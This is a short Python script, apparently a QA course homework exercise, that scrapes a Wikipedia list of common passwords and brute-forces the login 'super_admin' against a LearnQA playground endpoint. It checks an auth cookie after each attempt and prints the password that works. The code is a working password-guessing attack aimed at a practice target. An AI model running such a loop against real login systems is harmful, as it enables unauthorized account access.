import requests
from lxml import html

login = 'super_admin'

# Добываем список паролей и делаем этот список уникальным
response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
tree = html.fromstring(response.text)
locator = '//*[contains(text(),' \
          '"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)
uni_passwords = list(set(passwords))
true_pass = ''

cookie_url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
check_url = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'

# Берем пароль из списка, отправляем запрос и получаем куку
# Во втором запросе получаем ответ, если ответ положительный, то прерываем цикл
for password in uni_passwords:
    password = str(password).strip()
    # print(password)
    payload = {"login": login, "password": password}
    response1 = requests.post(url=cookie_url, data=payload)
    # print(dict(response1.cookies))
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}
    response2 = requests.post(url=check_url, cookies=cookies)
    # print(response2.text)
    if response2.text == 'You are authorized':
        true_pass = password
        break

print("Success!")
print(response2.text)
print(f"Your pass: {true_pass}")
